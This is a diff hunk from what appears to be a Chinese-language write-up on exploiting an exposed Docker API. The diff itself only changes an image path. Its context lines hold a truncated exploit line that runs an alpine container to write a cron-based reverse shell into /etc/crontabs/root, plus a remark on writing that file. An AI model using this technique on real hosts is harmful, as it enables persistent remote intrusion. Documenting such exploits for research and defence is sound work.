@@ -78,7 +78,7 @@ data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bi
 
 此处的反弹 shell 需要和/etc/crontabs/root 文件同时写入，不能后续追加。
 
-![image-20220222182515581](images/202202221825647.png)
+![image-20220222182515581](../.gitbook/assets/202202221825647.png)
 
 ## 漏洞 EXP
 
